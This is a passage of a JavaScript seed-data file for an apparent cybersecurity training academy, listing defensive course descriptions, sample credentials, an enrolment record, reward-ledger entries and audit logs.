    learning_objectives: ['Master bash command line for triage', 'Analyze /var/log/auth.log and auditd', 'Inspect active sockets and cron persistence'],
    prerequisites: ['None'],
    total_tokens_reward: 300,
    modules: []
  },
  {
    id: 'crs_networking_fund',
    slug: 'networking-fundamentals-for-soc',
    title: 'Networking Fundamentals & Traffic Analysis',
    version: '1.0',
    category: 'Foundation',
    difficulty: 'Beginner',
    card_variant: 'variant-08',
    art: '/assets/course-art/art-08.jpg',
    artPos: '80% 25%',
    estimated_weeks: 8,
    milestone_cert: 'Network Traffic Analyst Credential',
    skills: ["Wireshark & PCAP","TCP Handshake","DNS Exfiltration","Traffic Profiling"],
    price: 0,
    cert_price: 2499,
    estimated_duration: '12 Hours',
    rating: 4.85,
    enrolled_count: 1730,
    lead_author: {
      name: 'David Reynolds',
      title: 'Senior Defensive Architect, RedKross',
      avatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=256&q=80'
    },
    overview: 'Master OSI and TCP/IP models from a defensive angle: deep packet inspection with Wireshark, DNS tunneling detection, HTTP/HTTPS headers, and firewall rules.',
    learning_objectives: ['Analyze Wireshark PCAPs for malicious beacons', 'Identify DNS exfiltration', 'Read NetFlow telemetry'],
    prerequisites: ['Basic computer literacy'],
    total_tokens_reward: 350,
    modules: []
  },
  {
    id: 'crs_web_sec_fund',
    slug: 'web-security-fundamentals',
    title: 'Web Application Defense & API Security',
    version: '1.0',
    category: 'Specialist',
    difficulty: 'Intermediate',
    card_variant: 'variant-02',
    art: '/assets/course-art/art-02.jpg',
    artPos: '72% 28%',
    estimated_weeks: 10,
    milestone_cert: 'Web Application Defender Credential',
    skills: ["OWASP Top 10","WAF Filtering","SQLi & XSS Mitigation","API Security"],
    price: 2999,
    cert_price: 2999,
    estimated_duration: '14 Hours',
    rating: 4.92,
    enrolled_count: 1120,
    lead_author: {
      name: 'Sarah Chen, CISSP',
      title: 'Principal Incident Handler, RedKross Lab',
      avatar: 'https://images.unsplash.com/photo-1580489944761-15a19d654956?auto=format&fit=crop&w=256&q=80'
    },
    overview: 'Defending modern web apps and APIs: OWASP Top 10 mitigation, WAF rule tuning, JWT vulnerability defense, and secure session management.',
    learning_objectives: ['Defend against SQL injection and SSRF', 'Configure robust Content Security Policy (CSP)', 'Audit API endpoints for Broken Object Level Authorization (BOLA)'],
    prerequisites: ['Networking fundamentals', 'Basic HTTP understanding'],
    total_tokens_reward: 400,
    modules: []
  },
  {
    id: 'crs_incident_response',
    slug: 'enterprise-incident-response',
    title: 'Enterprise Incident Response Playbooks',
    version: '1.0',
    category: 'Professional',
    difficulty: 'Advanced',
    card_variant: 'variant-04',
    art: '/assets/course-art/art-04.jpg',
    artPos: '75% 35%',
    estimated_weeks: 12,
    milestone_cert: 'Incident Response Lead Specialist',
    skills: ["NIST 800-61","Ransomware Containment","Live Memory Triage","Crisis Playbooks"],
    price: 4999,
    cert_price: 4999,
    estimated_duration: '16 Hours',
    rating: 4.95,
    enrolled_count: 980,
    lead_author: {
      name: 'Sarah Chen, CISSP',
      title: 'Principal Incident Handler, RedKross Lab',
      avatar: 'https://images.unsplash.com/photo-1580489944761-15a19d654956?auto=format&fit=crop&w=256&q=80'
    },
    overview: 'Hands-on enterprise IR playbooks: ransomware negotiation tactics, cloud tenant compromise containment, Active Directory kerberoasting triage, and executive crisis reporting.',
    learning_objectives: ['Execute Active Directory threat containment', 'Perform cloud IAM credential revocation', 'Draft executive breach disclosure reports'],
    prerequisites: ['SOC Fundamentals', 'Networking Fundamentals'],
    total_tokens_reward: 500,
    modules: []
  },
  {
    id: 'crs_forensics_fund',
    slug: 'digital-forensics-investigation',
    title: 'Digital Forensics & Incident Evidence Analysis',
    version: '1.0',
    category: 'Specialist',
    difficulty: 'Intermediate',
    card_variant: 'variant-06',
    art: '/assets/course-art/art-06.jpg',
    artPos: '80% 25%',
    estimated_weeks: 10,
    milestone_cert: 'Certified Forensics Specialist',
    skills: ["Volatility 3","Shimcache & Amcache","Timeline Analysis","Registry Artifacts"],
    price: 3499,
    cert_price: 3499,
    estimated_duration: '15 Hours',
    rating: 4.88,
    enrolled_count: 860,
    lead_author: {
      name: 'David Reynolds',
      title: 'Senior Defensive Architect, RedKross',
      avatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=256&q=80'
    },
    overview: 'Evidence handling, timeline generation with plaso/log2timeline, Master File Table ($MFT) analysis, Shimcache and Amcache artifacts for program execution proof.',
    learning_objectives: ['Extract and parse Windows Shimcache', 'Build forensic super-timelines', 'Analyze memory dumps using Volatility 3'],
    prerequisites: ['Linux & Windows fundamentals'],
    total_tokens_reward: 450,
    modules: []
  },
  {
    id: 'crs_cloud_sec_fund',
    slug: 'cloud-security-workloads',
    title: 'Cloud Security Fundamentals (AWS & GCP)',
    version: '1.0',
    category: 'Specialist',
    difficulty: 'Intermediate',
    card_variant: 'variant-09',
    art: '/assets/course-art/art-09.jpg',
    artPos: '76% 30%',
    estimated_weeks: 10,
    milestone_cert: 'Cloud Security Defender Credential',
    skills: ["AWS IAM & GuardDuty","GCP Cloud Armor","Kubernetes RBAC","Workload Isolation"],
    price: 3999,
    cert_price: 3999,
    estimated_duration: '12 Hours',
    rating: 4.87,
    enrolled_count: 790,
    lead_author: {
      name: 'David Reynolds',
      title: 'Senior Defensive Architect, RedKross',
      avatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=256&q=80'
    },
    overview: 'Securing cloud infrastructure: IAM privilege escalation vectors, S3 bucket policy auditing, CloudTrail log analysis, and VPC flow log detection.',
    learning_objectives: ['Detect suspicious AWS STS AssumeRole activity', 'Audit GCP Service Account permissions', 'Harden container workloads in Kubernetes'],
    prerequisites: ['Linux fundamentals', 'Networking fundamentals'],
    total_tokens_reward: 400,
    modules: []
  },
  {
    id: 'crs_sec_governance',
    slug: 'security-governance-grc',
    title: 'Security Governance, Risk & Compliance (GRC)',
    version: '1.0',
    category: 'Advanced',
    difficulty: 'Advanced',
    card_variant: 'variant-07',
    art: '/assets/course-art/art-07.jpg',
    artPos: '78% 28%',
    estimated_weeks: 8,
    milestone_cert: 'Certified GRC Analyst',
    skills: ["ISO 27001 & SOC 2","Risk Matrices","Compliance Audits","Vendor Assessment"],
    price: 4499,
    cert_price: 4499,
    estimated_duration: '14 Hours',
    rating: 4.82,
    enrolled_count: 650,
    lead_author: {
      name: 'Sarah Chen, CISSP',
      title: 'Principal Incident Handler, RedKross Lab',
      avatar: 'https://images.unsplash.com/photo-1580489944761-15a19d654956?auto=format&fit=crop&w=256&q=80'
    },
    overview: 'Enterprise risk management: ISO 27001 implementation, SOC 2 compliance readiness, PCI-DSS requirements, vendor third-party risk assessments, and cyber insurance audits.',
    learning_objectives: ['Build an ISO 27001 Statement of Applicability', 'Perform third-party vendor risk scoring', 'Draft institutional security policies'],
    prerequisites: ['Cybersecurity fundamentals'],
    total_tokens_reward: 350,
    card_variant: 'variant-09',
    modules: []
  },
  {
    id: 'crs_threat_hunting',
    slug: 'advanced-threat-hunting-adversary-emulation',
    title: 'Advanced Threat Hunting & Adversary Emulation',
    version: '1.0',
    category: 'Threat Defense',
    difficulty: 'Advanced',
    card_variant: 'variant-10',
    art: '/assets/course-art/art-10.jpg',
    artPos: '76% 25%',
    estimated_weeks: 12,
    milestone_cert: 'Threat Hunting Specialist',
    skills: ["MITRE ATT&CK","Sigma Rules","Threat Intel Feeds","Behavioral Anomaly"],
    price: 4999,
    cert_price: 4999,
    estimated_duration: '16 Hours',
    rating: 4.95,
    enrolled_count: 820,
    lead_author: {
      name: 'Sarah Chen, CISSP',
      title: 'Principal Incident Handler, RedKross Lab',
      avatar: 'https://images.unsplash.com/photo-1580489944761-15a19d654956?auto=format&fit=crop&w=256&q=80'
    },
    overview: 'Proactive adversary hunting across live telemetry: memory dumps, YARA rules, Volatility 3 analysis, kernel tracing, and MITRE ATT&CK adversary emulation.',
    learning_objectives: ['Memory forensics with Volatility 3', 'Author high-precision YARA and Sigma rules', 'Simulate adversary TTPs and trace kernel events'],
    prerequisites: ['Operating system fundamentals', 'SOC Triage Experience'],
    total_tokens_reward: 500,
    card_variant: 'variant-10',
    modules: []
  }
];

export const INITIAL_VERIFIED_CREDENTIALS = [
  {
    id: 'cred_rk_soc_89421',
    verification_id: 'RK-SOC-89421',
    student_name: 'Atharv Sharma',
    course_id: 'crs_soc_fundamentals',
    course_title: 'SOC Fundamentals & Incident Response',
    credential_title: 'RedKross Certified SOC Analyst (RCSA)',
    type: 'Professional Certification',
    issue_date: '2026-10-15',
    expiration_date: '2028-10-15',
    grade_percentage: 92,
    status: 'Active',
    digital_signature: '0x8f4c39b1a0e8d726b1c3e590fa1284d7281bc832049a172e09b1f3c8e4d291a0',
    verification_url: 'https://academy.redkross.org.in/verify/RK-SOC-89421',
    skills_validated: [
      'SOC Operations & Log Ingestion',
      'MITRE ATT&CK Behavioral Mapping',
      'SIEM Correlation & Threat Triage',
      'Digital Forensics & Order of Volatility',
      'Incident Containment & Evidence Defensibility'
    ]
  },
  {
    id: 'cred_rk_sec_10482',
    verification_id: 'RK-SEC-10482',
    student_name: 'Vikramaditya Roy',
    course_id: 'crs_cyber_fund',
    course_title: 'Cybersecurity Fundamentals & Defensive Architecture',
    credential_title: 'Certificate of Course Completion',
    type: 'Course Completion',
    issue_date: '2026-09-20',
    expiration_date: 'Lifetime',
    grade_percentage: 88,
    status: 'Active',
    digital_signature: '0x12a9c384e09f8721c54b2d90ef8314bc721094da5e821038bc1a4f09e87123cd',
    verification_url: 'https://academy.redkross.org.in/verify/RK-SEC-10482',
    skills_validated: ['CIA Triad & Defence in Depth', 'Threat Modeling', 'Foundational Security Operations']
  }
];

export const INITIAL_ENROLMENTS = [
  {
    id: 'enr_student_soc',
    user_id: 'usr_student_01',
    course_id: 'crs_soc_fundamentals',
    course_version: '1.2',
    enrolled_at: '2026-10-10T10:00:00Z',
    status: 'active',
    completed_mandatory_lessons: ['les_1_1', 'les_1_2'],
    passed_quizzes: ['quiz_mod_1'],
    final_assessment_attempt_id: null,
    credential_id: null,
  }
];

export const INITIAL_REWARD_LEDGER = [
  {
    id: 'tx_init_welcome',
    user_id: 'usr_student_01',
    amount: 100,
    type: 'welcome_grant',
    description: 'Welcome onboard to RedKross Academy',
    idempotency_key: 'idemp_welcome_usr_student_01',
    created_at: '2026-10-10T10:00:00Z',
  },
  {
    id: 'tx_quiz_mod_1',
    user_id: 'usr_student_01',
    amount: 100,
    type: 'quiz_passed',
    description: 'First-time passing reward: Module 1 Evaluation',
    idempotency_key: 'idemp_quiz_quiz_mod_1_usr_student_01',
    created_at: '2026-10-12T14:30:00Z',
  },
  {
    id: 'tx_streak_bonus',
    user_id: 'usr_student_01',
    amount: 50,
    type: 'streak_reward',
    description: '7-Day Continuous Study Streak Bonus',
    idempotency_key: 'idemp_streak_7d_usr_student_01',
    created_at: '2026-10-17T09:00:00Z',
  }
];

export const INITIAL_AUDIT_LOGS = [
  {
    id: 'aud_1',
    actor_id: 'usr_admin_01',
    actor_email: 'admin@redkross.org.in',
    action: 'COURSE_PUBLISHED',
    entity_type: 'courses',
    entity_id: 'crs_soc_fundamentals',
    details: 'Published Course v1.2 with updated Module 3 Forensics guidelines',
    created_at: '2026-10-05T12:00:00Z'
  },
  {
    id: 'aud_2',
    actor_id: 'usr_admin_01',
    actor_email: 'admin@redkross.org.in',
    action: 'ROLE_ASSIGNED',
    entity_type: 'users',
    entity_id: 'usr_support_01',
    details: 'Granted student_support privileges to David Reynolds',
    created_at: '2026-10-06T09:30:00Z'
  }
];
